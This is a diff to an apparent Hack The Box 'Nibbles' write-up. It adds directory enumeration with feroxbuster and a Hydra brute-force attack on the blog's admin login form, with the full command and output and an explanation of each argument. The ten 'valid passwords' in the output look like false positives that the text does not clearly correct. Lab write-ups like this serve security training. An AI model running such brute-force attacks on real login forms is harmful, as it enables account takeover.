@@ -62,12 +62,44 @@ Looking on Exploit-DB i found that the `Nobbleblog v4.0.3` is vulnerable to Arbi
 ```
 # feroxbuster -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php
 200      GET       27l       96w     1401c http://nibbles.htb/nibbleblog/admin.php
+200      GET        2l       13w      370c http://nibbles.htb/nibbleblog/content/private/users.xml
 ```
+
+Looking at the users.xml we know that there's `admin` user present. 
+![](nibbles_web_user1.png)
+
+###### `Hydra to Brute Force Login Form`
+So we have got our login page at `http://nibbles.htb/nibbleblog/admin.php` and we know that the user admin is present. We will use Hydra to bruteforce the password.
+First we will provide correct username `admin` and incorrect password to capture the HTTP request through Burp.
+![](nibbles_web_user2.png)
+
+```
+# hydra -l admin -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt nibbles.htb http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-29 00:02:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking http-post-form://nibbles.htb:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password
+[80][http-post-form] host: nibbles.htb   login: admin   password: 12345678
+[80][http-post-form] host: nibbles.htb   login: admin   password: 123456
+[80][http-post-form] host: nibbles.htb   login: admin   password: 1234
+[80][http-post-form] host: nibbles.htb   login: admin   password: 696969
+[80][http-post-form] host: nibbles.htb   login: admin   password: football
+[80][http-post-form] host: nibbles.htb   login: admin   password: baseball
+[80][http-post-form] host: nibbles.htb   login: admin   password: master
+[80][http-post-form] host: nibbles.htb   login: admin   password: michael
+[80][http-post-form] host: nibbles.htb   login: admin   password: shadow
+[80][http-post-form] host: nibbles.htb   login: admin   password: monkey
+1 of 1 target successfully completed, 10 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-29 00:02:23
+
+```
+
+In the above command, `-l` is stating that we are going to use `admin` as a username. `-P` state that the wordlist will be used for the password file. `http-post-form` state that we are going to perform the bruteforce on the POST request. The parameters `"/nibbleblog/admin.php:username=^USER^&password=^PASS^"` is coming from the HTTP POST request and the `:Incorrect username or password` is coming from the same HTTP Response.  The box had a IP blacklist protection enabled. 
 
 ![](nibbles_web2.png)
 
-The default credentials works. 
-
+The default credentials works. However, I am going to try out Hydra to brute force the login form to get the correct Credentials. 
 ###### `Uploading Shell on My Image and getting Reverse Shell`
 
 ![](nibbles_web3.png)
